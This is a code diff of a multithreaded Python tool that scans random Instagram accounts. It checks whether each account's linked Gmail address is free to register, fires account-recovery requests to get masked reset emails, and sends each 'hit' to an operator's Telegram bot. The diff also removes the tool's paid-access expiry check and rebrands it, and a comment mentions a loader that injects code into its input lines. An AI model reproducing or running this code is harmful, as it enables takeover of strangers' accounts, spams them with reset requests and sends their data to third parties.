@@ -14,112 +14,70 @@ import secrets
 import base64
 import httpx
 import urllib.parse
-from datetime import datetime, timedelta, timezone
+from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor
 from user_agent import generate_user_agent
 
 MIN_FOLLOWERS = 0
-IST_OFFSET = timedelta(hours=5, minutes=30)
-
-def check_telegram_access(user_id):
-    try:
-        url = "https://raw.githubusercontent.com/samkushwah61-create/sam-acces/main/expiry.txt"
-        response = requests.get(url)
-        if response.status_code == 200:
-            lines = response.text.strip().splitlines()
-            for line in lines:
-                if "," in line and ":" in line:
-                    parts = line.strip().split(",")
-                    uid = parts[0].strip()
-                    date_part = parts[1].strip()
-                    try:
-                        expiry_ist = datetime.strptime(date_part, "%Y-%m-%d : %H:%M")
-                    except ValueError:
-                        print(f"⚠️ Invalid date format for user ID {uid}. Skipping.")
-                        continue
-                    if uid == str(user_id):
-                        now_ist = datetime.now(timezone.utc) + IST_OFFSET
-                        remaining = expiry_ist - now_ist.replace(tzinfo=None)
-                        if remaining.total_seconds() > 0:
-                            days, seconds = divmod(int(remaining.total_seconds()), 86400)
-                            hours, seconds = divmod(seconds, 3600)
-                            minutes, _ = divmod(seconds, 60)
-                            print(f"✅ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐆𝐑𝐀𝐍𝐓𝐄𝐃")
-                            print(f"⏳ 𝐓𝐢𝐦𝐞 𝐥𝐞𝐟𝐭: {days} days, {hours} hours, {minutes} minutes")
-                            return True, expiry_ist
-                        else:
-                            print("⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃: 𝐘𝐨𝐮𝐫 𝐩𝐫𝐞𝐦𝐢𝐮𝐦 𝐡𝐚𝐬 𝐞𝐱𝐩𝐢𝐫𝐞𝐝.")
-                            return False, None
-            print("⛔ 𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃: 𝐘𝐨𝐮'𝐫𝐞 𝐍𝐨𝐭 𝐏𝐫𝐞𝐦𝐢𝐮𝐦")
-            return False, None
-        else:
-            print("⚠️ Failed to fetch the user list.")
-            return False, None
-    except Exception as e:
-        print(f"⚠️ Error while checking access: {e}")
-        return False, None
-
 THREADS = 80
 
-GOLD = '\x1b[38;5;220m'
+GOLD   = '\x1b[38;5;220m'
 ORANGE = '\x1b[38;5;208m'
-WHITE = '\x1b[38;5;255m'
-DIM = '\x1b[38;5;240m'
-GREEN = '\x1b[38;5;120m'
-RED = '\x1b[38;5;196m'
-CYAN = '\x1b[38;5;51m'
-RESET = '\x1b[0m'
+WHITE  = '\x1b[38;5;255m'
+DIM    = '\x1b[38;5;240m'
+GREEN  = '\x1b[38;5;120m'
+RED    = '\x1b[38;5;196m'
+CYAN   = '\x1b[38;5;51m'
+RESET  = '\x1b[0m'
+
 
 def print_banner():
     os.system('cls' if os.name == 'nt' else 'clear')
     print("\n")
-    print(f"{GOLD}           ✦           .            ★            .           ✦{RESET}")
-    print(f"{WHITE}                                   .            ✧{RESET}")
-    print(f"{GOLD}                               S A M G O D  {RESET}")
-    print(f"{WHITE}                              ✦          .{RESET}")
-    print(f"{GOLD}           ✧           .            ★            .           ✧{RESET}")
+    print(f"{GOLD}           ✦           ·            ★            ·           ✦{RESET}")
+    print(f"{WHITE}                                   ·            ✧{RESET}")
+    print(f"{GOLD}                        𝗦 𝗔 𝗠 𝗙 𝗬 𝗞 𝗦{RESET}")
+    print(f"{WHITE}                              ✦          ·{RESET}")
+    print(f"{GOLD}           ✧           ·            ★            ·           ✧{RESET}")
     print("\n")
-    print(f"{DIM}                        DEV /  @SAMFYCKS / ✧           .              {RESET}")
+    print(f"{DIM}                     𝗗𝗘𝗩 /  @𝗦𝗔𝗠𝗚𝗢𝗗 / ✧           ·              {RESET}")
     print("\n")
 
+
+# ── Loader-compatible input lines (do NOT remove — insta.py regex injects here) ──
 print_banner()
-
 chat_id = input(f"{WHITE}Enter Telegram Chat ID: {RESET}")
 print("")
-
-access_granted, expiry_ist = check_telegram_access(chat_id)
-if not access_granted:
-    sys.exit()
-
 bot_token = input(f"{WHITE}Enter Telegram Bot Token: {RESET}")
 print("")
-os.system('cls' if os.name == 'nt' else 'clear')
 
+os.system('cls' if os.name == 'nt' else 'clear')
 print_banner()
-print(f"{DIM}                          SAMGOD TOOLS ACTIVE{RESET}")
-print(f"{DIM}                 Auto Stop: {expiry_ist.strftime('%Y-%m-%d %H:%M:%S')} IST{RESET}\n")
+print(f"{DIM}                          SAMFYKS TOOLS ACTIVE{RESET}")
+print(f"{DIM}                      Access Verified · Session Start{RESET}\n")
 
 start_time = time.time()
-now_ist = datetime.now(timezone.utc) + IST_OFFSET
-time_until_expiry = (expiry_ist - now_ist.replace(tzinfo=None)).total_seconds()
-if time_until_expiry <= 0:
-    print("\n❌ Expiry date has already passed.")
-    sys.exit()
-expire_time = start_time + time_until_expiry
 
 hits = 0
 good = 0
-bad = 0
+bad  = 0
 _display_lock = threading.Lock()
+
 
 def display():
     global hits, good, bad
     with _display_lock:
         uptime = int(time.time() - start_time)
         h, m, s = uptime // 3600, (uptime % 3600) // 60, uptime % 60
-        stats = f"\r{GOLD}GOOD: {GREEN}{good}{RESET} {DIM}|{RESET} {GOLD}HITS: {hits}{RESET} {DIM}|{RESET} {GOLD}BAD: {RED}{bad}{RESET} {DIM}|{RESET} {DIM}TIME: {h:02d}:{m:02d}:{s:02d}{RESET}     "
+        stats = (
+            f"\r{GOLD}GOOD: {GREEN}{good}{RESET} "
+            f"{DIM}|{RESET} {GOLD}HITS: {WHITE}{hits}{RESET} "
+            f"{DIM}|{RESET} {GOLD}BAD: {RED}{bad}{RESET} "
+            f"{DIM}|{RESET} {DIM}TIME: {h:02d}:{m:02d}:{s:02d}{RESET}     "
+        )
         sys.stdout.write(stats)
         sys.stdout.flush()
+
 
 class GoogleChecker:
     def __init__(self):
@@ -164,7 +122,8 @@ class GoogleChecker:
                         f.write(tl + '//' + host + '\n')
                     time.sleep(random.uniform(10, 30))
                     continue
-            except: pass
+            except Exception:
+                pass
             try:
                 headers = {
                     'accept': '*/*', 'accept-language': 'en', 'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
@@ -184,17 +143,20 @@ class GoogleChecker:
                         f.write(tl + '//' + host + '\n')
                     time.sleep(random.uniform(10, 30))
                     continue
-            except: pass
+            except Exception:
+                pass
             time.sleep(random.uniform(5, 15))
 
     def check_availability(self, email):
-        if '@' in email: email = email.split('@')[0]
+        if '@' in email:
+            email = email.split('@')[0]
         try:
             with open('tl.txt', 'r') as f:
                 line = f.read().strip()
-                if not line: raise Exception("Empty tl")
+                if not line:
+                    raise Exception("Empty tl")
                 tl, host = line.split('//')
-        except:
+        except Exception:
             time.sleep(3)
             with open('tl.txt', 'r') as f:
                 line = f.read().strip()
@@ -216,11 +178,14 @@ class GoogleChecker:
             f'&gmscoreversion=undefined&flowName=GlifWebSignIn&'
         )
         response = requests.post('https://accounts.google.com/_/signup/usernameavailability', params=params, cookies=cookies, headers=headers, data=data, timeout=10)
-        if '"gf.uar",1' in response.text: return 'good'
+        if '"gf.uar",1' in response.text:
+            return 'good'
         elif '"er",null,null,null,null,400' in response.text:
             time.sleep(1)
             return self.check_availability(email)
-        else: return 'bad'
+        else:
+            return 'bad'
+
 
 class InstagramChecker:
     def __init__(self):
@@ -232,7 +197,8 @@ class InstagramChecker:
 
     def _ensure_tokens(self):
         with self.lock:
-            if self.csrf and self.lsd: return True
+            if self.csrf and self.lsd:
+                return True
         try:
             headers = {
                 'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
@@ -249,7 +215,8 @@ class InstagramChecker:
                         self.csrf = csrf
                         self.lsd = lsd
                     return True
-        except: pass
+        except Exception:
+            pass
         return False
 
     def _check_bloks(self, email):
@@ -278,12 +245,13 @@ class InstagramChecker:
         }
         try:
             resp = requests.post(url, data=payload, headers=headers, timeout=20)
-            if f"{email}" in resp.text: return True
-            else: return False
-        except: return False
+            return email in resp.text
+        except Exception:
+            return False
 
     def _check_web_create(self, email):
-        if not self._ensure_tokens(): return False
+        if not self._ensure_tokens():
+            return False
         url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36',
@@ -297,17 +265,22 @@ class InstagramChecker:
             r = self.session.post(url, headers=headers, cookies=cookies, data=data, timeout=10)
             if r.status_code == 200:
                 json_data = r.json()
-                if 'email' in json_data.get('errors', {}): return True
+                if 'email' in json_data.get('errors', {}):
+                    return True
             return False
-        except: return False
+        except Exception:
+            return False
 
     def check_email(self, email):
-        if self._check_bloks(email): return True
-        if self._check_web_create(email): return True
+        if self._check_bloks(email):
+            return True
+        if self._check_web_create(email):
+            return True
         return False
 
     def get_user_data(self, user_id):
-        if not self._ensure_tokens(): return None
+        if not self._ensure_tokens():
+            return None
         url = "https://www.instagram.com/api/graphql"
         headers = {
             'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
@@ -333,9 +306,12 @@ class InstagramChecker:
             if response.status_code == 200:
                 data = response.json()
                 user = data.get('data', {}).get('user')
-                if user and user.get('username'): return user
-        except: pass
+                if user and user.get('username'):
+                    return user
+        except Exception:
+            pass
         return None
+
 
 class ReportManager:
     def __init__(self, token, chat_id, proxy=None):
@@ -350,38 +326,47 @@ class ReportManager:
         url = f"https://api.telegram.org/bot{self.token}/sendMessage"
         payload = {"chat_id": self.chat_id, "text": msg, "parse_mode": "HTML"}
         session = requests.Session()
-        if self.proxy: session.proxies.update(self.proxy)
+        if self.proxy:
+            session.proxies.update(self.proxy)
         for attempt in range(retries):
             try:
                 r = session.post(url, json=payload, timeout=15)
-                if r.status_code == 200: return True
+                if r.status_code == 200:
+                    return True
                 else:
                     if not self._error_logged:
-                        with open(self.log_file, 'a') as f: f.write(f"Telegram returned {r.status_code}: {r.text}\n")
+                        with open(self.log_file, 'a') as f:
+                            f.write(f"Telegram returned {r.status_code}: {r.text}\n")
                         self._error_logged = True
                     time.sleep(delay * (attempt + 1))
             except Exception as e:
                 if not self._error_logged:
-                    with open(self.log_file, 'a') as f: f.write(f"Telegram send error: {e}\n")
+                    with open(self.log_file, 'a') as f:
+                        f.write(f"Telegram send error: {e}\n")
                     self._error_logged = True
                 time.sleep(delay * (attempt + 1))
         return False
 
     def send_telegram(self, msg):
-        if not self._telegram_working: return False
+        if not self._telegram_working:
+            return False
         success = self._send_telegram_with_retry(msg)
-        if not success: self._telegram_working = False
+        if not success:
+            self._telegram_working = False
         return success
 
     def save_to_file(self, msg, filename='hits.txt'):
-        with open(filename, 'a', encoding='utf-8') as f: f.write(f'{msg}\n')
+        with open(filename, 'a', encoding='utf-8') as f:
+            f.write(f'{msg}\n')
 
     def _get_monetization_status(self, data):
         followers = data.get('follower_count', 0)
         posts = data.get('media_count', 0)
         is_private = data.get('is_private', True)
-        if followers >= 50 and posts >= 0 and not is_private: return "✅ Eligible"
-        else: return "❌ Not Eligible"
+        if followers >= 50 and posts >= 0 and not is_private:
+            return "✅ Eligible"
+        else:
+            return "❌ Not Eligible"
 
     @staticmethod
     def _esc(s):
@@ -412,14 +397,15 @@ class ReportManager:
                 if low <= pk <= high:
                     year = str(y)
                     break
-        except: year = "Unknown"
+        except Exception:
+            year = "Unknown"
 
         reset_mask = self._fetch_reset_email(username)
         monetization = self._get_monetization_status(data)
 
         console_lines = [
             f"\n{GOLD}✦ ─────────────────────────────────────── ✦{RESET}",
-            f"{GOLD}             SAMGOD HIT CAPTURED{RESET}",
+            f"{GOLD}             SAMFYKS HIT CAPTURED{RESET}",
             f"{GOLD}✦ ─────────────────────────────────────── ✦{RESET}",
             f"{WHITE}  Name      :{RESET} {DIM}{full_name}{RESET}",
             f"{WHITE}  Username  :{RESET} @{username}",
@@ -434,14 +420,14 @@ class ReportManager:
             f"{WHITE}  Monetize  :{RESET} {monetization}",
             f"{GOLD}✦ ─────────────────────────────────────── ✦{RESET}",
             f"{WHITE}  Profile   :{RESET} {CYAN}https://instagram.com/{username}{RESET}",
-            f"{GOLD}✦ ─────────────────────────────────────── ✦{RESET}\n",
+            f"{GOLD}✦ ─────────────────────────────────────── ✦\n",
         ]
         console_msg = '\n'.join(console_lines)
 
         e = self._esc
         tg_lines = [
             "✦ ─────────────────────────────────────── ✦",
-            "             <b>SAMGOD HIT CAPTURED</b>",
+            "             <b>SAMFYKS HIT CAPTURED</b>",
             "✦ ─────────────────────────────────────── ✦",
             f"  <b>Name</b>      : {e(full_name)}",
             f"  <b>Username</b>  : @{e(username)}",
@@ -471,20 +457,21 @@ class ReportManager:
             r = client.post("https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", data={"email_or_username": username})
             if r.status_code == 200:
                 data = r.json()
-                if data.get("status") == "ok": return data.get('obfuscated_email') or data.get('contact_point') or "-"
+                if data.get("status") == "ok":
+                    return data.get('obfuscated_email') or data.get('contact_point') or "-"
             return "-"
-        except: return "-"
+        except Exception:
+            return "-"
+
 
 reporter = ReportManager(bot_token, chat_id)
 google = GoogleChecker()
 insta = InstagramChecker()
 
+
 def process_user():
     global hits, good, bad
     while True:
-        if time.time() > expire_time:
-            print(f"\n{WHITE}Time expired. Stopping workers.{RESET}")
-            sys.exit(0)
         try:
             user_id = random.randint(2500000000, 21254029834)
             user_data = insta.get_user_data(user_id)
@@ -492,7 +479,8 @@ def process_user():
                 time.sleep(random.uniform(0.05, 0.15))
                 continue
             username = user_data.get('username')
-            if not username: continue
+            if not username:
+                continue
             followers = user_data.get('follower_count', 0)
             if followers < MIN_FOLLOWERS:
                 time.sleep(random.uniform(0.02, 0.08))
@@ -525,11 +513,13 @@ def process_user():
             time.sleep(random.uniform(0.1, 0.2))
             continue
 
+
 if __name__ == "__main__":
     with ThreadPoolExecutor(max_workers=THREADS) as executor:
         for _ in range(THREADS):
             executor.submit(process_user)
     try:
-        while True: time.sleep(1)
+        while True:
+            time.sleep(1)
     except KeyboardInterrupt:
-        print('\n' + GOLD + '◄  SAMGOD HITTER  —  SESSION ENDED  ►' + RESET)
+        print('\n' + GOLD + '◄  SAMFYKS TOOLS  —  SESSION ENDED  ►' + RESET)
